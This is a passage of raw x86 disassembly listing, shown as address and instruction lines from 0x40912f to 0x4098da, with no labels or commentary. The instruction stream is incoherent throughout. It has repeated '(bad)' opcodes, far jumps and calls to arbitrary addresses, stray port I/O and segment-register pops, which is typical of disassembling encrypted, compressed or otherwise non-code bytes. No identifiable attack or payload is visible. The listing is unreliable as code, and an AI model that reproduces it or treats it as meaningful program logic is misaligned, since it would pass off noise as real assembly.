  40912f:	ins    BYTE PTR es:[edi],dx
  409130:	adc    dh,BYTE PTR [edx]
  409132:	call   DWORD PTR [esp+ebx*4-0x13]
  409136:	dec    esp
  409137:	pop    edi
  409138:	int    0xa0
  40913a:	inc    esp
  40913b:	mov    bh,0x6c
  40913d:	mov    eax,ds:0x2dcf0092
  409142:	pop    ebx
  409143:	sub    al,0x7f
  409145:	ror    edx,1
  409147:	jne    0x4091a6
  409149:	jno    0x409142
  40914b:	adc    eax,0xee6d48e2
  409150:	(bad)  
  409151:	jmp    0x83116d0c
  409156:	fadd   DWORD PTR [eax]
  409158:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409159:	lock lahf 
  40915b:	inc    ecx
  40915c:	inc    ecx
  40915d:	dec    esi
  40915e:	xor    eax,0x25eeca0d
  409163:	cmc    
  409164:	sahf   
  409165:	mov    bl,0x4f
  409167:	ret    
  409168:	div    BYTE PTR [eax+0x4b]
  40916b:	xlat   BYTE PTR ds:[ebx]
  40916c:	jge    0x40915f
  40916e:	inc    ecx
  40916f:	scas   eax,DWORD PTR es:[edi]
  409170:	mov    DWORD PTR [edi],ecx
  409172:	fsubr  QWORD PTR ds:0x1d4da039
  409178:	xchg   BYTE PTR [edx+0x56],cl
  40917b:	dec    edi
  40917c:	sub    BYTE PTR gs:[ebx+0x36],cl
  409180:	fst    QWORD PTR [edi+0x29]
  409183:	mov    eax,ds:0x844bb68d
  409188:	push   0xffffffcd
  40918a:	outs   dx,DWORD PTR ds:[esi]
  40918b:	adc    esi,ecx
  40918d:	pushf  
  40918e:	clc    
  40918f:	or     ecx,DWORD PTR [edi+0x72]
  409192:	inc    ebp
  409193:	shr    DWORD PTR [ecx],cl
  409195:	std    
  409196:	add    dh,bh
  409198:	mov    edx,DWORD PTR [edx-0x7]
  40919b:	xchg   esi,edx
  40919d:	mov    esi,0x79f82334
  4091a2:	cs scas al,BYTE PTR es:[edi]
  4091a4:	xchg   esi,eax
  4091a5:	loopne 0x409196
  4091a7:	mov    edx,0x5e459ef8
  4091ac:	mov    al,0x69
  4091ae:	mov    eax,ds:0x9591443a
  4091b3:	push   ds
  4091b4:	addr16 dec edx
  4091b6:	out    dx,eax
  4091b7:	shr    BYTE PTR [ebp-0x543248a],cl
  4091bd:	pop    ss
  4091be:	and    al,0x50
  4091c0:	scas   eax,DWORD PTR es:[edi]
  4091c1:	add    BYTE PTR [eax-0x3],0x89
  4091c5:	xchg   ecx,eax
  4091c6:	fsubrp st(7),st
  4091c8:	add    BYTE PTR [esi-0x13],dl
  4091cb:	(bad)
  4091ce:	in     al,0xfd
  4091d0:	pop    esp
  4091d1:	xchg   esi,eax
  4091d2:	ins    DWORD PTR es:[edi],dx
  4091d3:	fwait
  4091d4:	rol    DWORD PTR [eax-0x70feb029],cl
  4091da:	push   ebx
  4091db:	scas   eax,DWORD PTR es:[edi]
  4091dc:	rol    BYTE PTR [ecx-0x74],cl
  4091df:	xor    al,0xc9
  4091e1:	cmp    eax,0xe6f897d7
  4091e6:	js     0x4091ec
  4091e8:	inc    ebp
  4091e9:	jge    0x40920d
  4091eb:	js     0x409221
  4091ed:	lock push eax
  4091ef:	xor    al,0xe3
  4091f1:	aaa    
  4091f2:	jmp    0x56893948
  4091f7:	pop    edi
  4091f8:	into   
  4091f9:	xchg   esi,eax
  4091fa:	dec    esp
  4091fb:	test   eax,0x825f0777
  409200:	xchg   ebx,eax
  409201:	jmp    DWORD PTR [edx]
  409203:	test   al,0xaf
  409205:	xor    DWORD PTR [ebx+edi*8-0x47cc340d],ecx
  40920c:	ins    BYTE PTR es:[edi],dx
  40920d:	or     al,BYTE PTR [edi+0x51a442a3]
  409213:	ss dec edx
  409215:	mov    edi,0x2a2c58da
  40921a:	sti    
  40921b:	fs adc eax,0x45d81be8
  409221:	es jmp 0x8124ff1c
  409227:	jb     0x4092a2
  409229:	pop    es
  40922a:	dec    esi
  40922b:	pop    ds
  40922c:	sar    BYTE PTR [esi],cl
  40922e:	in     eax,0x8
  409230:	xchg   ebx,eax
  409231:	xchg   BYTE PTR [eax],ch
  409233:	jbe    0x4091d4
  409235:	repnz shl BYTE PTR [esi+0x70],1
  409239:	jmp    0x409236
  40923b:	loopne 0x409280
  40923d:	fnstenv [eax+0x855fe88]
  409243:	mov    ecx,0x31fba79f
  409248:	loop   0x409212
  40924a:	mov    ds:0xbec0ed59,al
  40924f:	outs   dx,DWORD PTR ds:[esi]
  409250:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409251:	nop
  409252:	xlat   BYTE PTR ds:[ebx]
  409253:	xor    esp,ecx
  409255:	mov    ss:0x8a9d365d,al
  40925b:	mov    bl,0xc5
  40925d:	je     0x409235
  40925f:	fsub   QWORD PTR [ebx+0x49b567d3]
  409265:	call   0x9fe9:0x892fff5b
  40926c:	sub    eax,0x71eb4e4b
  409271:	or     bl,BYTE PTR [edx]
  409273:	push   ss
  409274:	mov    bl,BYTE PTR [ebp-0x41bdadcd]
  40927a:	mov    dh,0xb1
  40927c:	xor    al,0x64
  40927e:	mov    ds:0x20038b86,al
  409283:	rcr    dl,cl
  409285:	sub    bl,BYTE PTR [eax]
  409287:	ins    BYTE PTR es:[edi],dx
  409288:	lds    edx,FWORD PTR [esi-0x1b8deb69]
  40928e:	or     esi,edi
  409290:	daa    
  409291:	sbb    al,0xa9
  409293:	and    DWORD PTR [ebx+edx*1+0x771d45a6],edi
  40929a:	sti    
  40929b:	test   DWORD PTR [edi-0x7b0f558e],esi
  4092a1:	pusha  
  4092a2:	(bad)  
  4092a3:	retf   
  4092a4:	add    ch,BYTE PTR [edi+0x5586cbe3]
  4092aa:	sbb    ecx,edx
  4092ac:	inc    ebx
  4092ad:	push   ds
  4092ae:	out    dx,eax
  4092af:	xchg   esi,edx
  4092b1:	fs stc 
  4092b3:	push   0xfffffff0
  4092b5:	inc    edx
  4092b6:	pop    ds
  4092b7:	pop    ds
  4092b8:	pop    ds
  4092b9:	fisubr DWORD PTR [ecx-0x10]
  4092bc:	js     0x4092d9
  4092be:	mov    cl,ch
  4092c0:	popa   
  4092c1:	inc    esp
  4092c2:	xchg   edx,eax
  4092c3:	xor    DWORD PTR [edi-0x53a7e76],esi
  4092c9:	xchg   edi,eax
  4092ca:	push   es
  4092cb:	adc    dh,BYTE PTR [edi-0x59]
  4092ce:	inc    di
  4092d0:	pushf  
  4092d1:	pop    ebp
  4092d2:	daa    
  4092d3:	das    
  4092d4:	push   es
  4092d5:	iret   
  4092d6:	sbb    eax,0xe7247550
  4092db:	xor    esi,esp
  4092dd:	push   edi
  4092de:	scas   al,BYTE PTR es:[edi]
  4092df:	cmc    
  4092e0:	pop    eax
  4092e1:	cmp    dh,BYTE PTR [ecx]
  4092e3:	fldcw  WORD PTR [ecx+0x2bdd8964]
  4092e9:	sub    al,0xab
  4092eb:	cmp    dh,BYTE PTR [eax]
  4092ed:	dec    edx
  4092ee:	dec    esi
  4092ef:	(bad)  
  4092f0:	es dec ecx
  4092f2:	jmp    0x59b78de4
  4092f7:	jecxz  0x409310
  4092f9:	(bad)  
  4092fa:	jae    0x40932e
  4092fc:	dec    edx
  4092fd:	out    dx,eax
  4092fe:	les    esp,FWORD PTR [eax-0x5c28f41a]
  409304:	xor    eax,0xe01aa0b0
  409309:	xor    al,0x75
  40930b:	loop   0x40933a
  40930d:	xchg   edx,eax
  40930e:	or     al,0x7a
  409310:	mov    al,ds:0xc4ce7c48
  409315:	fcom   QWORD PTR [ecx-0x18c71c49]
  40931b:	or     esi,DWORD PTR [esi+eiz*8]
  40931e:	or     dh,BYTE PTR [ebx+0x4d]
  409321:	sub    eax,0x8128c9f8
  409326:	jg     0x4092b5
  409328:	loope  0x40939a
  40932a:	sbb    DWORD PTR [edx+0x1f],0xfffffff6
  40932e:	popa   
  40932f:	sub    DWORD PTR [ecx+0x5e],edi
  409332:	les    ecx,FWORD PTR [edx]
  409334:	addr16 push edi
  409336:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409337:	ins    BYTE PTR es:[edi],dx
  409338:	cmp    DWORD PTR [esi+ebx*1],eax
  40933b:	mov    DWORD PTR [edi],ebp
  40933d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40933e:	jecxz  0x40930a
  409340:	jmp    0x4092db
  409342:	and    eax,0x4f1837ab
  409347:	ss xor al,0x75
  40934a:	setns  BYTE PTR [edx-0x199ce1d8]
  409351:	shr    BYTE PTR [ecx-0x46],0xbe
  409355:	scas   al,BYTE PTR es:[edi]
  409356:	div    DWORD PTR [edi]
  409358:	out    0x2,al
  40935a:	xor    eax,DWORD PTR [edi-0x4e]
  40935d:	aaa    
  40935e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40935f:	mov    eax,0x19acd912
  409364:	xchg   esp,eax
  409365:	dec    ebp
  409366:	mov    al,0xb
  409368:	mov    BYTE PTR [esi-0x2e],0xe9
  40936c:	xor    edx,DWORD PTR [eax-0x39e63001]
  409372:	loopne 0x409323
  409374:	jmp    0x4093e1
  409376:	dec    esp
  409377:	mov    al,ds:0x6e393cf6
  40937c:	in     eax,0x11
  40937e:	xor    bh,bl
  409380:	imul   edi,DWORD PTR ds:0xa15e3c62,0x5e3d4dc1
  40938a:	mov    cl,0x9e
  40938c:	ret    0x9eb
  40938f:	mov    dh,0x34
  409391:	test   eax,0x36fb3e1c
  409396:	pop    ebx
  409397:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409398:	clc    
  409399:	out    0xca,eax
  40939b:	xor    al,0x71
  40939d:	mov    eax,ds:0x66fe7166
  4093a2:	bound  edx,QWORD PTR [ecx]
  4093a4:	sub    eax,0xa839e3e0
  4093a9:	sbb    DWORD PTR [ecx+0x41],eax
  4093ac:	ret    0x4219
  4093af:	mov    eax,ds:0x153e03bc
  4093b4:	shr    DWORD PTR [esi+0x63],0xb3
  4093b8:	imul   esi,DWORD PTR [ecx-0x71],0x54
  4093bc:	xor    al,BYTE PTR [ecx+0x50]
  4093bf:	in     al,dx
  4093c0:	push   edx
  4093c1:	fadd   DWORD PTR [eax+0x64]
  4093c4:	scas   eax,DWORD PTR es:[edi]
  4093c5:	mov    es,WORD PTR [ecx+0x4]
  4093c8:	enter  0xa00c,0xfa
  4093cc:	shr    BYTE PTR [ebx],0xad
  4093cf:	pop    eax
  4093d0:	push   ecx
  4093d1:	push   edx
  4093d2:	mov    DWORD PTR [ebx-0x60],edi
  4093d5:	jae    0x409415
  4093d7:	gs out 0x58,al
  4093da:	in     eax,0xdd
  4093dc:	pop    ebp
  4093dd:	in     eax,dx
  4093de:	jnp    0x4093bd
  4093e0:	cmp    ecx,DWORD PTR [ecx+0x5c44936f]
  4093e6:	mov    ds:0xcbb25aa,eax
  4093eb:	pop    edi
  4093ec:	sbb    DWORD PTR [edx],0x4190b178
  4093f2:	cmp    edx,DWORD PTR [edx+0x68]
  4093f5:	dec    esp
  4093f6:	xor    eax,0xe4b09db
  4093fb:	or     BYTE PTR [ebx-0x53],bl
  4093fe:	jmp    0x409384
  409400:	cmc    
  409401:	mov    esp,0x601225e0
  409406:	xor    al,0xdc
  409408:	pop    ebp
  409409:	gs jo  0x4093b0
  40940c:	jo     0x4093ad
  40940e:	cmp    edi,ebp
  409410:	out    0x11,eax
  409412:	in     al,0xd1
  409414:	jae    0x4093ce
  409416:	mov    ah,BYTE PTR [esi+ebx*2-0x5d79defe]
  40941d:	push   edi
  40941e:	sub    cl,BYTE PTR [esi-0x21a4a017]
  409424:	retf   0x52e2
  409427:	pushf  
  409428:	push   es
  409429:	sub    BYTE PTR [ebx-0x74d45f95],dh
  40942f:	and    dh,al
  409431:	jnp    0x409430
  409433:	fs mov al,0x70
  409436:	mov    ecx,0x4e4326e1
  40943b:	scas   eax,DWORD PTR es:[edi]
  40943c:	pop    esp
  40943d:	outs   dx,BYTE PTR ds:[esi]
  40943e:	xor    dh,al
  409440:	ror    bh,0x37
  409443:	nop
  409444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409445:	cs jmp 0x1646:0x43265d17
  40944d:	sbb    DWORD PTR [ecx+eax*4],edi
  409450:	sub    ch,BYTE PTR [ecx]
  409452:	cmp    ebx,DWORD PTR [eax+0x639949a5]
  409458:	loopne 0x4094b7
  40945a:	mov    al,ds:0xb6a75cea
  40945f:	xchg   esi,eax
  409460:	jno    0x4093ee
  409462:	push   0x78
  409464:	loop   0x409411
  409466:	les    eax,FWORD PTR [edi+0x1e]
  409469:	sub    BYTE PTR [edi-0xc],0x1d
  40946d:	iret   
  40946e:	cs sti 
  409470:	jnp    0x409440
  409472:	sub    al,0x83
  409474:	gs nop
  409476:	add    al,0xc9
  409478:	test   DWORD PTR [edi+0x45558eb4],esi
  40947e:	push   ds
  40947f:	outs   dx,BYTE PTR ds:[esi]
  409480:	cwde   
  409481:	les    ecx,FWORD PTR [edi-0x767db68d]
  409487:	imul   ecx,DWORD PTR [eax+0x39],0x37
  40948b:	addr16 sub al,0x7c
  40948e:	dec    eax
  40948f:	xchg   esp,eax
  409490:	test   al,0x9d
  409492:	jno    0x40946b
  409494:	daa    
  409495:	dec    ebp
  409496:	ja     0x409460
  409498:	aam    0xdd
  40949a:	add    al,0xf5
  40949c:	rcl    BYTE PTR [esp+ebp*4-0x1428ae3c],0xa3
  4094a4:	(bad)  
  4094a5:	mov    dh,0x4c
  4094a7:	out    0x30,al
  4094a9:	std    
  4094aa:	test   cl,ch
  4094ac:	and    esi,DWORD PTR [edi+0x58]
  4094af:	inc    esi
  4094b0:	jne    0x4094f7
  4094b2:	inc    ecx
  4094b3:	mov    ch,0xbd
  4094b5:	mov    ds:0xfec921b4,al
  4094ba:	sar    BYTE PTR ds:0x9857b8c6,1
  4094c0:	cmp    al,0x5c
  4094c2:	mov    DWORD PTR [eax+ebp*1+0x1322ae93],ecx
  4094c9:	mov    ch,BYTE PTR [edi+ecx*8+0x3]
  4094cd:	(bad)  
  4094ce:	in     eax,dx
  4094cf:	shl    DWORD PTR [ebp-0x61],cl
  4094d2:	xor    bh,BYTE PTR [ebp-0x7a0c665]
  4094d8:	push   esi
  4094d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094da:	jp     0x40950d
  4094dc:	push   ds
  4094dd:	js     0x4094d8
  4094df:	dec    ecx
  4094e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094e1:	icebp  
  4094e2:	mov    edx,esi
  4094e4:	ds pop ecx
  4094e6:	cmc    
  4094e7:	mov    esi,0xb4bdde4b
  4094ec:	xchg   BYTE PTR [edi+0x36],dh
  4094ef:	ins    DWORD PTR es:[edi],dx
  4094f0:	pop    edi
  4094f1:	loope  0x409541
  4094f3:	xor    eax,0x152b3fac
  4094f8:	mov    BYTE PTR [eax-0x30],cl
  4094fb:	mov    ebp,DWORD PTR [ecx-0x22fc7a3]
  409501:	(bad)  
  409502:	out    dx,al
  409503:	fisttp QWORD PTR [esi]
  409505:	sbb    bh,dh
  409507:	in     al,dx
  409508:	push   es
  409509:	pop    ss
  40950a:	jo     0x409494
  40950c:	jbe    0x40956f
  40950e:	sub    BYTE PTR [ebp-0x36],0x13
  409512:	sub    BYTE PTR [edx-0x3d],ah
  409515:	add    edi,DWORD PTR fs:[ebx-0x5160f5ce]
  40951c:	mov    ds:0xa0bd0492,al
  409521:	pop    ecx
  409522:	out    0x31,eax
  409524:	call   DWORD PTR ss:0xdfee8b92
  40952b:	jae    0x4094b9
  40952d:	dec    ecx
  40952e:	xchg   esp,eax
  40952f:	xchg   DWORD PTR [edx],ebp
  409531:	lds    ebp,FWORD PTR [edx+0x62a38756]
  409537:	sar    BYTE PTR [ecx+0x7dd661a8],cl
  40953d:	pop    ss
  40953e:	xchg   ebx,eax
  40953f:	cdq    
  409540:	push   esp
  409541:	jno    0x4094d8
  409543:	jns    0x409588
  409545:	fwait
  409546:	mov    ds:0xde1c28ef,al
  40954b:	jnp    0x4095c5
  40954d:	pop    eax
  40954e:	idiv   BYTE PTR [edx-0x26]
  409551:	and    al,0x54
  409553:	cmc    
  409554:	inc    edx
  409555:	sbb    al,0xe4
  409557:	in     eax,0x38
  409559:	stc    
  40955a:	jecxz  0x409576
  40955c:	call   0xde204a8c
  409561:	xchg   BYTE PTR [ebp-0x1b],cl
  409564:	sti    
  409565:	loopne 0x40956c
  409567:	addr16 pop ebp
  409569:	addr16 sti 
  40956b:	mov    edi,0x6b9c527d
  409570:	fs dec esp
  409572:	cmp    bh,BYTE PTR [esi-0x3a5cd053]
  409578:	inc    ecx
  409579:	sbb    DWORD PTR [edi],esp
  40957b:	sub    DWORD PTR [eax],ebp
  40957d:	fnstcw WORD PTR [esi-0x31]
  409580:	sbb    BYTE PTR [edx+0x65],bl
  409583:	aaa    
  409584:	ss xchg edx,eax
  409586:	daa    
  409587:	in     al,dx
  409588:	(bad)  
  409589:	jae    0x40952a
  40958b:	add    DWORD PTR [ebx+0x6c04a998],eax
  409591:	mov    bl,0x19
  409593:	push   esi
  409594:	dec    esi
  409595:	inc    ebp
  409596:	jae    0x409565
  409598:	inc    ebx
  409599:	in     eax,0xf2
  40959b:	pop    esi
  40959c:	pop    ecx
  40959d:	popa   
  40959e:	das    
  40959f:	mov    ds:0x7664c2c5,al
  4095a4:	dec    ebp
  4095a5:	stos   DWORD PTR es:[edi],eax
  4095a6:	outs   dx,BYTE PTR ds:[esi]
  4095a7:	aam    0xe7
  4095a9:	or     ebx,DWORD PTR [eax-0x46]
  4095ac:	or     bl,BYTE PTR [esi]
  4095ae:	dec    ebx
  4095af:	cmc    
  4095b0:	call   DWORD PTR [ebx-0x5d53456d]
  4095b6:	sub    eax,0x6f77919d
  4095bb:	in     eax,0x24
  4095bd:	fadd   QWORD PTR [edx]
  4095bf:	push   ebx
  4095c0:	sub    al,0xdf
  4095c2:	pop    esi
  4095c3:	add    eax,0x9f712848
  4095c8:	add    DWORD PTR ds:0xefec55de,0xffffffd2
  4095cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095d1:	test   BYTE PTR [ecx],dl
  4095d3:	repz in eax,0xcf
  4095d6:	mov    edx,0x8255586d
  4095db:	xlat   BYTE PTR ds:[ebx]
  4095dc:	cmc    
  4095dd:	mov    ebp,ecx
  4095df:	jne    0x40957a
  4095e1:	leave  
  4095e2:	mul    edx
  4095e4:	stc    
  4095e5:	pop    esi
  4095e6:	ins    BYTE PTR es:[edi],dx
  4095e7:	leave  
  4095e8:	or     dh,0xd8
  4095eb:	mov    eax,0x67395f0f
  4095f0:	dec    esp
  4095f1:	add    ah,bh
  4095f3:	aad    0x9e
  4095f5:	mov    bl,0xc8
  4095f7:	cmp    eax,0x5c4cc9f9
  4095fc:	outs   dx,BYTE PTR ds:[esi]
  4095fd:	sbb    ah,ch
  4095ff:	adc    DWORD PTR [edi+0x4],ecx
  409602:	jmp    0x887e:0x9de2c70
  409609:	add    BYTE PTR ds:0x7ea8f86a,ch
  40960f:	icebp  
  409610:	adc    al,0x2e
  409613:	pop    ecx
  409614:	into   
  409615:	mov    eax,0x5bce577d
  40961a:	nop
  40961b:	(bad)  
  40961c:	xor    DWORD PTR [ebx+0xf],edi
  40961f:	inc    eax
  409620:	adc    bl,ah
  409622:	xor    DWORD PTR [eax],eax
  409624:	cmp    DWORD PTR [ebx-0x1],edx
  409627:	push   ss
  409628:	xor    eax,0xc2d5d9d0
  40962d:	cmp    eax,0xb3bb289d
  409632:	test   BYTE PTR [edx+0x4beab4af],bl
  409638:	stos   BYTE PTR es:[edi],al
  409639:	mov    esi,0xbbeeab1c
  40963e:	push   0xffffff87
  409640:	xchg   ebp,eax
  409641:	pop    edx
  409642:	mov    ebp,0x132ce084
  409647:	sub    ch,0x26
  40964a:	add    eax,DWORD PTR [ebx+0x3e39c96e]
  409650:	mov    edx,0x40de961f
  409655:	(bad)  
  409656:	dec    esp
  409657:	mov    esp,0x4e35d04
  40965c:	mov    ebp,0x6bddc37f
  409661:	or     edi,DWORD PTR [ecx+eiz*1]
  409664:	into   
  409665:	test   DWORD PTR [esi],esp
  409667:	or     BYTE PTR [ebx-0x39],dl
  40966a:	jae    0x409617
  40966c:	or     al,0xdd
  40966e:	loope  0x4096bf
  409670:	xor    BYTE PTR [esp+ecx*1-0x7b],cl
  409674:	ss mov ebx,0x7d2ae7e0
  40967a:	cli    
  40967b:	mov    al,ds:0xaf5008f8
  409680:	and    al,0x52
  409682:	cmc    
  409683:	data16 add al,0xd7
  409686:	sahf   
  409687:	mov    cl,0x69
  409689:	call   0x49bb:0x40857186
  409690:	loope  0x409652
  409692:	fiadd  DWORD PTR [edi+0x4a]
  409695:	push   ecx
  409696:	mov    ds:0xef8faa3a,al
  40969b:	adc    DWORD PTR [eax+eax*1-0x27],0x1c
  4096a0:	aaa    
  4096a1:	outs   dx,BYTE PTR ds:[esi]
  4096a2:	or     eax,DWORD PTR [edx-0x1571c756]
  4096a8:	retf   
  4096a9:	(bad)  
  4096aa:	push   ds
  4096ab:	pop    ebx
  4096ac:	or     DWORD PTR ds:0x49bd51b5,eax
  4096b2:	mov    DWORD PTR [edi+ecx*4+0x2],0xcaa26efe
  4096ba:	cmp    DWORD PTR [ebx+0x77],ecx
  4096bd:	inc    ecx
  4096be:	test   cl,dl
  4096c0:	(bad)  
  4096c2:	xchg   ecx,eax
  4096c3:	inc    ebp
  4096c4:	in     eax,dx
  4096c5:	push   edx
  4096c6:	retf   0x4389
  4096c9:	xor    al,BYTE PTR [eax+0x3da3964b]
  4096cf:	and    BYTE PTR [eax],ch
  4096d1:	add    BYTE PTR [edx+0x5bc1ea2b],bh
  4096d7:	mov    al,0x97
  4096d9:	or     bh,BYTE PTR [edx-0x18abe602]
  4096df:	lea    esp,[ebp+0x78aaa6b5]
  4096e5:	neg    DWORD PTR [eax-0x4455903]
  4096eb:	ret    0xaa80
  4096ee:	cmp    cl,BYTE PTR [ebx+0x39158dfb]
  4096f4:	aad    0x33
  4096f6:	rol    DWORD PTR [esi-0x41a27585],1
  4096fc:	addr16 pop es
  4096fe:	xchg   edx,eax
  4096ff:	ror    DWORD PTR [edx+0x7599517d],cl
  409705:	dec    edi
  409706:	rol    DWORD PTR [eax],0xb5
  409709:	cmp    bh,ch
  40970b:	dec    ecx
  40970c:	rcl    DWORD PTR [edi+0x40ebba19],cl
  409712:	xor    al,0x86
  409714:	outs   dx,BYTE PTR ds:[esi]
  409715:	aam    0xdf
  409717:	ds mov bh,0xe
  40971a:	mov    edx,0xca7f951d
  40971f:	fidiv  WORD PTR [edx-0x49844493]
  409725:	sub    DWORD PTR [edx],esp
  409727:	out    dx,al
  409728:	jbe    0x4096ea
  40972a:	mov    al,0x9c
  40972c:	ss lahf 
  40972e:	and    BYTE PTR ds:0x14c518a9,0x61
  409735:	inc    eax
  409736:	pop    ebx
  409737:	dec    ebx
  409738:	js     0x4096c4
  40973a:	or     eax,0x1e175dc7
  40973f:	and    esi,DWORD PTR [esi-0x32]
  409742:	push   0x10
  409744:	and    cl,BYTE PTR [ecx]
  409746:	cdq    
  409747:	mov    bh,BYTE PTR ds:0xa49ab584
  40974d:	mov    ch,0x8d
  40974f:	pop    esi
  409750:	or     BYTE PTR [eax-0x4d],bh
  409753:	inc    ebx
  409754:	fwait
  409755:	popf   
  409756:	jb     0x409769
  409758:	sub    esp,DWORD PTR [ebx]
  40975a:	pop    ebp
  40975b:	jb     0x4096f3
  40975d:	jmp    0x40973b
  40975f:	dec    ebx
  409760:	test   DWORD PTR [esi+0x10],edx
  409763:	lahf   
  409764:	push   cs
  409765:	(bad)  
  409766:	xlat   BYTE PTR cs:[ebx]
  409768:	inc    eax
  409769:	shr    bl,cl
  40976b:	jmp    0x409749
  40976d:	or     al,0x3
  40976f:	(bad)  [ecx]
  409771:	xor    BYTE PTR [esi+0x39],0x94
  409775:	xor    DWORD PTR [ebp+0x49],esi
  409778:	add    ecx,DWORD PTR [eax+ecx*8]
  40977b:	fidivr WORD PTR [ecx+0x28]
  40977e:	jg     0x409722
  409780:	(bad)
  409784:	mov    DWORD PTR [ebp+eax*1+0x38c48100],ebx
  40978b:	dec    DWORD PTR [ebx]
  40978d:	sub    ah,ah
  40978f:	stos   DWORD PTR es:[edi],eax
  409790:	add    eax,0x8cef7868
  409795:	fldenv [ebp+0x19c1b581]
  40979b:	(bad)
  40979e:	popa   
  40979f:	push   es
  4097a0:	jmp    0x40973f
  4097a2:	shl    DWORD PTR [eax+0x1a],cl
  4097a5:	push   esi
  4097a6:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4097a8:	xchg   edi,eax
  4097a9:	pop    edx
  4097aa:	out    dx,al
  4097ab:	fcomip st,st(1)
  4097ad:	add    DWORD PTR [eax-0x38],ebp
  4097b0:	xchg   ebx,eax
  4097b1:	dec    eax
  4097b2:	jp     0x4097e2
  4097b4:	scas   eax,DWORD PTR es:[edi]
  4097b5:	aaa    
  4097b6:	and    DWORD PTR [edx+0x43],ebx
  4097b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097ba:	outs   dx,BYTE PTR ds:[esi]
  4097bb:	jg     0x4097c2
  4097bd:	clc    
  4097be:	(bad)  [esi]
  4097c0:	fstp   TBYTE PTR [ebp-0x43]
  4097c3:	push   edx
  4097c4:	retf   
  4097c5:	xchg   ebp,eax
  4097c6:	sbb    ebp,ecx
  4097c8:	and    eax,0x5cddf300
  4097cd:	lods   eax,DWORD PTR ds:[esi]
  4097ce:	dec    ecx
  4097cf:	outs   dx,BYTE PTR ds:[esi]
  4097d0:	mov    ds:0xd042bdf6,eax
  4097d5:	out    dx,al
  4097d6:	(bad)  
  4097d7:	imul   ecx,esp,0xffffffc7
  4097da:	dec    eax
  4097db:	cld    
  4097dc:	lods   al,BYTE PTR ds:[esi]
  4097dd:	popa   
  4097de:	mov    dl,0xbd
  4097e0:	cmp    al,0x81
  4097e2:	xlat   BYTE PTR ds:[ebx]
  4097e3:	ss xchg ebp,eax
  4097e5:	add    dl,BYTE PTR [ebx+0xa805648]
  4097eb:	test   dh,ah
  4097ed:	dec    ebp
  4097ee:	jl     0x409869
  4097f0:	push   ss
  4097f1:	arpl   WORD PTR [ecx],ax
  4097f3:	popa   
  4097f4:	ins    BYTE PTR es:[edi],dx
  4097f5:	sub    eax,0xd92eae78
  4097fa:	out    dx,eax
  4097fb:	mov    bl,0x69
  4097fd:	xchg   ebx,eax
  4097fe:	int3   
  4097ff:	jl     0x4097d7
  409801:	addr16 mov eax,0xad3d8adb
  409807:	xor    al,0xa5
  409809:	ror    BYTE PTR [ebp-0x10],0xa2
  40980d:	and    DWORD PTR [ebp+edx*4-0x9],ebp
  409811:	pushf  
  409812:	fisttp WORD PTR [edi+0x77]
  409815:	sub    dl,BYTE PTR [ecx+ecx*1-0x2d2359f]
  40981c:	shr    BYTE PTR [eax+edx*1-0x16],0x6d
  409821:	jo     0x409807
  409823:	jecxz  0x4097f2
  409825:	sbb    al,0xde
  409827:	fidiv  DWORD PTR [esi+0x6caccd2c]
  40982d:	lar    edx,WORD PTR [ebp+0x3c40df32]
  409834:	test   BYTE PTR [ebx+ecx*2],ah
  409837:	jmp    0x4dc0:0x3f93f899
  40983e:	sub    BYTE PTR [edi],dh
  409840:	in     al,dx
  409841:	mov    ebx,0xbdc5118f
  409846:	out    dx,al
  409847:	scas   eax,DWORD PTR es:[edi]
  409848:	push   0x35bfea2b
  40984d:	fsubr  DWORD PTR [edx+0x1e]
  409850:	outs   dx,DWORD PTR ds:[esi]
  409851:	dec    ebx
  409852:	sbb    al,0x8
  409854:	xchg   esi,eax
  409855:	lfs    edi,FWORD PTR [ebp-0x9]
  409859:	les    ecx,FWORD PTR [esi]
  40985b:	std    
  40985c:	add    bh,BYTE PTR [esi+0x50cdef63]
  409862:	mov    ebp,0x26a25950
  409867:	leave  
  409868:	sbb    BYTE PTR [ebx],dh
  40986a:	icebp  
  40986b:	pop    esp
  40986c:	in     al,dx
  40986d:	scas   eax,DWORD PTR es:[edi]
  40986e:	sub    ebp,DWORD PTR [eax+0x6e]
  409871:	push   es
  409872:	retf   
  409873:	repnz fcomp DWORD PTR [edi+0x74391c0f]
  40987a:	(bad)  
  40987b:	in     eax,0x32
  40987d:	sti    
  40987e:	daa    
  40987f:	adc    al,0x41
  409881:	push   eax
  409882:	mov    BYTE PTR [ecx+ebp*1-0x2e],0xaa
  409887:	out    dx,eax
  409888:	inc    eax
  409889:	push   ebp
  40988a:	xor    bh,al
  40988c:	sub    DWORD PTR [ecx-0x14a0c3f9],esi
  409892:	jecxz  0x4098b1
  409894:	dec    ebp
  409895:	scas   eax,DWORD PTR es:[edi]
  409896:	pop    ds
  409897:	jmp    0x7b1d:0x49f340c5
  40989e:	ss or  al,0xe4
  4098a1:	ret    0x9c4e
  4098a4:	mov    esp,0x259ffdd9
  4098a9:	js     0x4098f5
  4098ab:	gs sbb al,0x3e
  4098ae:	dec    ebp
  4098af:	ja     0x409927
  4098b1:	pop    esp
  4098b2:	lea    esp,[edx]
  4098b4:	mov    gs,WORD PTR [edi]
  4098b6:	add    ah,dh
  4098b8:	scas   eax,DWORD PTR es:[edi]
  4098b9:	sbb    esp,esp
  4098bb:	imul   edi,edx,0xfd066640
  4098c1:	shr    DWORD PTR [ebp+ebp*4-0x440b5fba],1
  4098c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098c9:	sbb    ecx,DWORD PTR [eax+edx*2+0xa159ea1]
  4098d0:	inc    edi
  4098d1:	pop    ebx
  4098d2:	pushf  
  4098d3:	pop    ecx
  4098d4:	data16 mov ds:0x98adf1ef,al
  4098da:	push   esi
